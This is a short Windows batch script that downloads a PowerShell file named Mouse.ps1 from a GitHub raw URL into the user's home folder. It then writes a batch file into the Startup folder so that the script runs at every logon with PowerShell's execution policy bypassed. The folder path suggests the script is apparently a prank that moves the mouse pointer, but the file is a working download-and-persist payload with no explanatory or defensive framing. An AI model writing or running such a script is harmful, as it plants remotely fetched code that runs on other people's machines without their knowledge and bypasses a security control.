cd %homepath%
Powershell Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Babyporkchop/Scripts/main/Mouse/On Startup/Corner/Mouse.ps1' -OutFile .\Mouse.ps1
cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
echo cd %%homepath%% > A.bat
echo powershell -ExecutionPolicy Bypass -File Mouse.ps1 >> A.bat
